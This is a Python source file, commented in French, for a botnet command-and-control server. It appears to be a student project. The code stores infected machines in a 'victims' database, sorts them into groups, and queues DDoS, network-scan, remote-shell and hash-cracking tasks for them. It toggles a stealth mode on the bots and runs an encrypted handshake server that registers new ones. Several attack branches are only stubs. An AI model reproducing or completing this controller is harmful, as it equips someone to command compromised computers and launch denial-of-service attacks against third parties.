import socket
from env import *
import threading
import argparse
from queue import Queue, Empty
import select
import base64
import mysql.connector
import sys
import rsa

import json
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes





# Fonctions



def handle_client(host, port, queue):
    running = True

    while running:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((host, port))
            s.listen()
            print("ecoute sur : " + str(host) + ":" + str(port))
            conn, addr = s.accept()
        

        return conn, addr


def emission(queue, conn, addr):

    running = True
    while running:
        message = queue.get()

        if message == 'stop-thread':
            running = False
            print("stopping emission thread on ip " + str(addr))
        else:
            conn.sendall(message)
            # print("data sent to " + str(addr))


def reception(queue, conn, addr):

    running = True
    while running:
        data = conn.recv(1024)
        if not data:
            running = False
            print("stopping reception thread on ip " + str(addr))
        else:
            queue.put(data)
            print("data received from " + str(addr))



def group_exists(group_name):
    query = "SELECT id FROM groups WHERE name = %s;"
    values = (group_name, )

    mycursor.execute(query, values)
    result = mycursor.fetchall()

    return len(result) > 0


def get_group_id(group_name):
    query = "SELECT id FROM groups WHERE name = %s"
    values = (group_name, )

    mycursor.execute(query, values)
    result = mycursor.fetchall()

    if len(result) < 1:
        return None
    else:
        return result[0][0]
    

def get_group_of(id = None, uid = None):
    if id is not None:
        query = "SELECT groups.name FROM groups INNER JOIN victim_groups ON groups.id = victim_groups.group_id WHERE victim_groups.victim_id = %s"
        values = (id, )
    elif uid is not None:
        query = "SELECT groups.name FROM groups INNER JOIN victim_groups ON groups.id = victim_groups.group_id WHERE victim_groups.victim_id = (SELECT id FROM victims WHERE uid = %s)"
        values = (uid, )
    else:
        return None

    mycursor.execute(query, values)
    result = mycursor.fetchall()

    groups = []

    for group in result:
        groups.append(group[0])

    if len(result) < 1:
        return None
    else:
        return groups


# Fin fonctions



# Arguments
# -h, --help            montre le message d'aide
# -a, --action          permet de sélectionner une action (ex: "ddos", "scan", "shell", "endpoint", "keylogger", "screenshot", "decrypt", "download", "crypto")
# -s, --stop            permet de stopper l'action en cours
# -g, --group           permet de sélectionner un groupe d'ordinateur. Pour séléctionner plusieurs groupes, il faut les séparer par des virgules (ex: "ESGI,PARIS")
# -h, --host            permet de sélectionner un ordinateur. Pour séléctionner plusieurs hosts, il faut les séparer par des virgules (ex: "10.10.10.10,12.12.12.12")
# -lg, --list-group     montre la liste des groupes ordinateurs
# -lh, --list-host      montre la liste des ordinateurs
# -cg, --create-group   créer un groupe d'ordinateurs
# -dg, --delete-group   supprime un groupe d'ordinateur

# python3 main.py -g ESGI,PARIS -a ddos 10.11.12.13
# python3 main.py -h 10.10.10.10 -a shell

# python3 main.py -cg ESGI 100.100.100.100,13.13.13.13


parser = argparse.ArgumentParser()

# Groupe mutuellement exclusif pour les attaques
action_group = parser.add_mutually_exclusive_group()

# Démarrage du serveur
action_group.add_argument("--start", action="store_true", help="démarre le serveur")

# Arguments spécifiques à l'attaque DDoS
action_group.add_argument("--ddos", action="store_true", help="lance une attaque ddos sur un ordinateur")

# Arguments spécifiques à l'attaque de crack
action_group.add_argument("--crack", action="store_true", help="lance une attaque de crack sur un ordinateur")

# Lance un shell sur une machine précise
action_group.add_argument("--shell", action="store_true", help="Lance un shell sur une machine précise")

# Lance un VPN sur une machine précise
action_group.add_argument("--endpoint", action="store_true", help="Lance une connexion VPN sur une machine précise")

# Lance un VPN sur une machine précise
action_group.add_argument("--scan", action="store_true", help="Scan le réseau d'une machine précise ou d'un groupe")

# Active/désactive le mode discretion
action_group.add_argument("--stealth", action="store_true",  help="Active le mode discretion sur une ou plusieurs machines. Limite l'utilisation de l'ordinateur")
action_group.add_argument("--no-stealth", action="store_true",  help="Désactive le mode discretion sur une ou plusieurs machines. Enlève la limite d'utilisation de l'ordinateur")

# Active/désactive le mode multi-task
action_group.add_argument("--multi-task", action="store_true",  help="Active le mode multi-task sur une ou plusieurs machines. Permet de lancer plusieurs taches en même temps")
action_group.add_argument("--no-multi-task", action="store_true",  help="Désactive le mode multi-task sur une ou plusieurs machines. Limite les taches à une seule à la fois")

# Arguments pour les différentes attaques
parser.add_argument("--port", type=int, help="démarre le serveur sur le port suivant")
parser.add_argument("--address", type=str, help="adresse ip de l'ordinateur à attaquer")
parser.add_argument("--time", type=int, help="temps de l'attaque ddos en seconde")
parser.add_argument("--hash", type=str, help="hash à cracker")
parser.add_argument("--wordlist", type=str, help="wordlist")


# Gestion des groupes
action_group.add_argument("--list-host", action="store_true", help="Montre la liste des ordinateurs")
action_group.add_argument("--list-group", action="store_true", help="Montre la liste des groupes d'ordinateurs")
action_group.add_argument("--create-group", nargs='+', type=str, help="Créer un groupe d'ordinateurs. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--add-to-group", nargs=2, type=str, help="Ajoute des ordinateurs à un groupe. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--remove-from-group", nargs=2, type=str, help="Retire des ordinateurs d'un groupe. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--delete-group", type=str, help="Supprime un groupe d'ordinateurs")


# Groupe mutuellement exclusif pour la sélection du groupe ou de l'ordinateur
group_or_host = parser.add_mutually_exclusive_group()
group_or_host.add_argument("-G", "--group", type=str, help="permet de sélectionner un groupe d'ordinateur. Pour sélectionner plusieurs groupes, il faut les séparer par des virgules (ex: 'ESGI,PARIS')")
group_or_host.add_argument("-H", "--host", type=str, help="permet de sélectionner un ordinateur. Pour sélectionner plusieurs hosts, il faut les séparer par des virgules")


args = parser.parse_args()




# Database
db = mysql.connector.connect(
    host=DBHOST,
    user=DBUSER,
    password=DBPASSWORD,
    database=DB
)


mycursor = db.cursor()



if args.ddos:
    if not args.address or not args.time:
        parser.error("--ddos nécessite les arguments --address et --time")

    elif not args.host and not args.group:
        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")

    elif args.host and args.group:
        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")
    
    elif args.host:
        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")

    elif args.group:

        print("ddos sur " + args.address + " pendant " + str(args.time) + " secondes avec le(s) groupe(s) " + args.group)
    
        for group in args.group.split(","):
            query = "SELECT id FROM groups WHERE name = %s"
            values = (group, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO group_attacks (group_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], 
                          "ddos", 
                          "pending", 
                          "{\"address\": \"" + args.address + "\", \"time\": \"" + str(args.time) + "\"}")

                mycursor.execute(query, values)

    else:
        parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")


############################################################


elif args.crack:
    if not args.hash or not args.wordlist:
        parser.error("--crack nécessite les arguments --hash et --wordlist")
    elif not args.host and not args.group:
        parser.error("--scan nécessite l'argument --host et/ou --group")

    print("crack du hash '" + args.hash + "' avec la wordlist " + args.wordlist)


############################################################


elif args.shell:
    if args.group:
        parser.error("--shell n'accepte pas l'argument --group")
    elif not args.host:
        parser.error("--shell nécessite l'argument --host")
    print("shell sur " + args.host)


############################################################


elif args.endpoint:
    if args.group:
        parser.error("--endpoint n'accepte pas l'argument --group")
    elif not args.host:
        parser.error("--endpoint nécessite l'argument --host")
    print("connexion VPN sur " + args.host)


############################################################


elif args.scan:
    if not args.host and not args.group:
        parser.error("--scan nécessite l'argument --host ou --group")


    elif args.host and args.group:
        parser.error("--scan nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")

        
    elif args.host:
        print("lancement du scan sur " + args.host)
    
        for victim in args.host.split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "scan", "pending", "test")

                mycursor.execute(query, values)
    
    elif args.group:
        print("lancement du scan sur " + args.group)
    
        for group in args.group.split(","):
            query = "SELECT id FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
            values = (group, )
            mycursor.execute(query, values)

            result = mycursor.fetchall()

            for id in result:
                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (id[0], "scan", "pending", "test")

                mycursor.execute(query, values)

    else:
        parser.error("mauvaise utilisation de --scan. Veuillez vous référer à l'aide")


############################################################


elif args.stealth:
    if not args.host and not args.group:
        parser.error("--stealth nécessite l'argument --host et/ou --group")

    elif args.host and args.group:
        parser.error("--stealth nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")

    elif args.no_stealth:
        parser.error("--stealth et --no-stealth sont mutuellement exclusifs")
        
    elif args.host:
        print("activation du mode stealth sur " + args.host)

        query = "UPDATE victims SET stealth = 1, updated = 1 WHERE id = %s OR uid = %s"

        for victim in args.host.split(","):
            values = (victim, victim, victim)
            mycursor.execute(query, values)

    
    elif args.group:
        print("activation du mode stealth sur " + args.group)

        query = "UPDATE victims SET stealth = 1, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"

        for group in args.group.split(","):
            values = (group, )
            mycursor.execute(query, values)

    else:
        parser.error("mauvaise utilisation de --stealth. Veuillez vous référer à l'aide")


############################################################


elif args.no_stealth:
    if not args.host and not args.group:
        parser.error("--no-stealth nécessite l'argument --host et/ou --group")

    elif args.host and args.group:
        parser.error("--no-stealth nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")

    elif args.stealth:
        parser.error("--no-stealth et --stealth sont mutuellement exclusifs")
        
    elif args.host:
        print("désactivation du mode stealth sur " + args.host)

        query = "UPDATE victims SET stealth = 0, updated = 1 WHERE id = %s OR uid = %s"

        for victim in args.host.split(","):
            values = (victim, victim, victim)
            mycursor.execute(query, values)

    
    elif args.group:
        print("désactivation du mode stealth sur " + args.group)

        query = "UPDATE victims SET stealth = 0, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"

        for group in args.group.split(","):
            values = (group, )
            mycursor.execute(query, values)

    else:
        parser.error("mauvaise utilisation de --no-stealth. Veuillez vous référer à l'aide")


############################################################


elif args.multi_task:
    if not args.host and not args.group:
        parser.error("--multi-task nécessite l'argument --host et/ou --group")

    elif args.host and args.group:
        parser.error("--multi-task nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")

    elif args.no_multi_task:
        parser.error("--multi-task et --no-multi-task sont mutuellement exclusifs")
        
    elif args.host:
        print("activation du mode multi-task sur " + args.host)

        query = "UPDATE victims SET multi_thread = 1, updated = 1 WHERE id = %s OR uid = %s"

        for victim in args.host.split(","):
            values = (victim, victim, victim)
            mycursor.execute(query, values)

    
    elif args.group:
        print("activation du mode multi-task sur " + args.group)

        query = "UPDATE victims SET multi_thread = 1, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"

        for group in args.group.split(","):
            values = (group, )
            mycursor.execute(query, values)

    else:
        parser.error("mauvaise utilisation de --multi-task. Veuillez vous référer à l'aide")


############################################################


elif args.no_multi_task:
    if not args.host and not args.group:
        parser.error("--no-multi-task nécessite l'argument --host ou --group")

    elif args.host and args.group:
        parser.error("--no-multi-task nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")

    elif args.multi_task:
        parser.error("--no-multi-task et --multi-task sont mutuellement exclusifs")
        
    elif args.host:
        print("désactivation du mode multi-task sur " + args.host)

        query = "UPDATE victims SET multi_thread = 0, updated = 1 WHERE id = %s OR uid = %s"

        for victim in args.host.split(","):
            values = (victim, victim, victim)
            mycursor.execute(query, values)

    
    elif args.group:
        print("désactivation du mode multi-task sur " + args.group)

        query = "UPDATE victims SET multi_thread = 0, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"

        for group in args.group.split(","):
            values = (group, )
            mycursor.execute(query, values)

    else:
        parser.error("mauvaise utilisation de --no-multi-task. Veuillez vous référer à l'aide")


############################################################


elif args.list_host:
    if args.host:
        parser.error("--list-host n'accepte pas l'argument --host")

    elif args.group:
        print("liste des ordinateurs du groupe " + args.group)

        group_name = args.group


        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)

        # Récupération des ordinateurs du groupe
        query = "SELECT ip, uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
        values = (group_name, )

        mycursor.execute(query, values)

        result = mycursor.fetchall()
        nb_victims = len(result)

        print("Il y a " + str(nb_victims) + " ordinateurs dans le groupe " + group_name)
        for victim in result:
            print(victim[0] + " - " + victim[1])


    else:
        print("liste des ordinateurs du botnet")

        # Récupération des ordinateurs
        query = "SELECT ip, uid FROM victims"

        mycursor.execute(query)

        result = mycursor.fetchall()
        nb_victims = len(result)

        print("Il y a " + str(nb_victims) + " ordinateur(s) dans le botnet")
        for victim in result:
            victim_groups = get_group_of(uid=victim[1])

            if victim_groups is None:
                print("No group", end="")
            
            else:
                for group in victim_groups:
                    print(group, end=", ")

            print(" - " + victim[0] + " - " + victim[1])


############################################################


elif args.list_group:
    if args.host or args.group:
        parser.error("--list-group n'accepte pas les arguments --host et --group")

    else:
        # Récupération des groupe
        query = "SELECT name FROM groups"

        mycursor.execute(query)

        result = mycursor.fetchall()
        nb_groups = len(result)

        print("Il y a " + str(nb_groups) + " groupe(s) : ")
        for group in result:
            print(group[0])


############################################################


elif args.create_group:
    if args.host or args.group:
        parser.error("--create-group n'accepte pas les arguments --host et --group")

    else:

        if len(args.create_group) > 2:
            parser.error("--create-group n'accepte que 2 arguments")

        # Création du groupe
        print("création du groupe " + args.create_group[0])

        group_name = args.create_group[0]


        if not group_name.isalnum():
            print("Le nom du groupe ne doit contenir que des caractères alphanumériques")
            exit(1)


        # Vérification de l'existence du groupe
        if group_exists(group_name):
            print("Le groupe existe déjà")
            exit(1)


        # Création du groupe
        query = "INSERT INTO groups (name, image, created_at, updated_at) VALUES (%s, 'default.png', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
        values = (group_name, )

        mycursor.execute(query, values)

        # Récupération des ordinateurs à ajouter au groupe
        if len(args.create_group) == 2:
            victims_list = []

            for victim in args.create_group[1].split(","):
                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                values = (victim, victim, victim)

                mycursor.execute(query, values)
                result = mycursor.fetchall()

                if len(result) == 0:
                    print("L'ordinateur '" + victim + "' n'existe pas")

                for id in result:
                    victims_list.append(id[0])


            # Ajout des ordinateurs au groupe
            for victim_id in victims_list:
                query = "INSERT INTO victim_groups (group_id, victim_id, created_at, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (group_name, victim_id)

                mycursor.execute(query, values)


        else:
            print("Le groupe a été créé sans ordinateur")


############################################################


elif args.add_to_group:
    if args.host or args.group:
        parser.error("--add-to-group n'accepte pas les arguments --host et --group")

    else:
        print("ajout des ordinateurs " + args.add_to_group[1] + " au groupe " + args.add_to_group[0])

        group_name = args.add_to_group[0]

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)

        else:
            # Récupération des ordinateurs à ajouter au groupe
            victims_list = []

            for victim in args.add_to_group[1].split(","):
                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                values = (victim, victim, victim)

                mycursor.execute(query, values)
                result = mycursor.fetchall()

                if len(result) == 0:
                    print("L'ordinateur '" + victim + "' n'existe pas")

                for id in result:
                    victims_list.append(id[0])


            # Ajout des ordinateurs au groupe
            for victim_id in victims_list:
                query = "INSERT INTO victim_groups (group_id, victim_id, created_at, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (group_name, victim_id)

                mycursor.execute(query, values)

          
############################################################
  

elif args.remove_from_group:
    if args.host or args.group:
        parser.error("--remove-from-group n'accepte pas les arguments --host et --group")

    else:
        print("suppression des ordinateurs " + args.remove_from_group[1] + " du groupe " + args.remove_from_group[0])

        group_name = args.remove_from_group[0]

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)

        else:
            # Récupération des ordinateurs à retirer au groupe
            victims_list = []

            for victim in args.remove_from_group[1].split(","):
                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                values = (victim, victim, victim)

                mycursor.execute(query, values)
                result = mycursor.fetchall()

                if len(result) == 0:
                    print("L'ordinateur '" + victim + "' n'existe pas")

                for id in result:
                    victims_list.append(id[0])


            # Retrait des ordinateurs au groupe
            for victim_id in victims_list:
                query = "DELETE FROM victim_groups WHERE victim_id = %s AND group_id = (SELECT id FROM groups WHERE name = %s)"
                values = (victim_id, group_name)

                mycursor.execute(query, values)


############################################################


elif args.delete_group:
    if args.host or args.group:
        parser.error("--delete-group n'accepte pas les arguments --host et --group")

    else:
        print("suppression du groupe " + args.delete_group)

        group_name = args.delete_group

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)

        else:
            # Récupération de l'id du group à supprimer
            group_id = get_group_id(group_name)

            # Suppression du lien victim/group du groupe à supprimer
            query = "DELETE FROM victim_groups WHERE group_id = %s"
            values = (group_id, )

            mycursor.execute(query, values)

            # Suppression du fichier image si ce n'est pas default.png

            ######## à faire

            # Suppression du groupe
            query = "DELETE FROM groups WHERE id = %s"
            values = (group_id, )

            mycursor.execute(query, values)


############################################################


elif args.start:
    if not args.port or args.port < 1023 or args.port > 65535:
        parser.error("--start nécessite l'argument --port compris entre 1023 et 65535")
    else:
        print("démarrage du serveur sur le port " + str(args.port))


        #(addr, conn, thread_emission, emission_queue, thread_reception, reception_queue, sym_key, iv)
        clients = []

        # Socket
        host = "127.0.0.1"
        port = args.port

        socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socket_server.setblocking(0)
        socket_server.bind((host, port))
        socket_server.listen()
        print("ecoute sur : " + str(host) + ":" + str(port))


        connection_list = [socket_server]

        # Database
        db = mysql.connector.connect(
            host=DBHOST,
            user=DBUSER,
            password=DBPASSWORD,
            database=DB
        )


        mycursor = db.cursor()

        running = True


        while running:
            # print("running")
            # print(connection_list)

            read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)


            # print("read_sockets : " + str(read_sockets))

            for sock in read_sockets:
                # Nouvelle connexion
                if sock is socket_server:
                    conn, addr = sock.accept()

                    # Création des threads d'émission et de réception
                    emission_queue = Queue()
                    thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr))
                    thread_emission.start()

                    reception_queue = Queue()
                    thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr))
                    thread_reception.start()

                    # Handshake
                    print("handshake with " + str(addr))

                    # Récupération de la clé publique du client
                    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())
                    # print("public key : " + str(public_key))

                    # Génération de la clé symétrique
                    sym_key = get_random_bytes(16)
                    iv = get_random_bytes(16)
                    # print("symetric key : " + str(sym_key))
                    # print("iv : " + str(iv))

                    json_conf = '{"action":"' + base64.b64encode("client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(sym_key).decode() + '","b64iv":"' + base64.b64encode(iv).decode() + '","multithread":true,"stealth":true}'

                    # Chiffrement de la data avec la clé publique du client
                    encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)

                    # Envoi de la clé symétrique chiffrée
                    emission_queue.put(encrypted_sym_key)

                    # print("[+] Waiting for client handshake informations")

                    received_data = reception_queue.get()

                    cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                    pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
                    # print("received data : " + str(pt))

                    # Récupération de l'uid client
                    uid = json.loads(pt)["uid"]

                    # Vérification de l'uid dans la base de données
                    query = "SELECT * FROM victims WHERE uid = %s"
                    values = (uid,)

                    mycursor.execute(query, values)

                    myresult = mycursor.fetchall()

                    if len(myresult) > 0:
                        # print("client already in the database")
                        query = "UPDATE victims SET ip = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
                        values = (addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)

                        mycursor.execute(query, values)

                    else:
                        # print("client not in the database")
                        # Ajout du client à la base de données

                        query = "INSERT INTO victims (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
                        values = (uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)

                        mycursor.execute(query, values)

                    db.commit()

                    # Ajout du client à la liste des clients
                    clients.append(dict(uid = uid, 
                                        addr = addr, 
                                        conn = conn, 
                                        thread_emission = thread_emission, 
                                        emission_queue = emission_queue, 
                                        thread_reception = thread_reception, 
                                        reception_queue = reception_queue, 
                                        sym_key = sym_key, 
                                        iv = iv
                                    ))


            
            for client in clients:
                # Récupération des attaques de groupe à lancer
            

                # Récupération des attaques individuelles à lancer
                
                    


                # Récupération des données clients
                try:
                    encrypted_data_received = client['reception_queue'].get_nowait()

                    cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                    pt = unpad(cipher.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')

                    print(client['addr'])
                    print("received data : " + str(pt))

                except Empty:
                    pass
                    




















else :
    parser.error("no action specified. Use -h/--help for help")

db.commit()